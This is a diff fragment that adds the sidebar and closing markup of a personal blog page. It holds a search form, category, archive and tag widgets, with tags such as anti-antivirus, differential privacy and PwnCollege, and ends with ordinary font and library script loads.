+            <input name="keyword" required placeholder="Type something..." />
+        
+            <button title="Search">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+        
+            <section class="widget categories">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+  
+        </div> 
+        <h2 class="widget-title section-title">Categories</h2>
+    <div class="widget-categories--list">
+<div class="widget">
+    <h3 class="widget-title"> </h3>
+    <div class="widget-body">
+        <div class="category-list">
+            <div class="category-list-item"><a href="https://id-none.github.io/categories/academic/" class="category-list-link">academic<span class="category-list-count">1</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://id-none.github.io/categories/technology/" class="category-list-link">technology<span class="category-list-count">2</a>
+            </span></div>
+        </div>
+    </div>
+</div>
+    </div>
+    </section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Archives</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2024">
+                        
+                            <span class="year">2024</span>
+                            <span class="count">3</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">Tags</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/anti-antivirus/" class="font_size_1">
+                Anti-AntiVirus
+            </a>
+        
+            <a href="/tags/differential-privacy/" class="font_size_1">
+                Differential Privacy
+            </a>
+        
+            <a href="/tags/go/" class="font_size_1">
+                Go
+            </a>
+        
+            <a href="/tags/huorong/" class="font_size_1">
+                Huorong
+            </a>
+        
+            <a href="/tags/location-privacy-protection/" class="font_size_1">
+                Location Privacy Protection
+            </a>
+        
+            <a href="/tags/pwn/" class="font_size_1">
+                Pwn
+            </a>
+        
+            <a href="/tags/pwncollege/" class="font_size_1">
+                PwnCollege
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
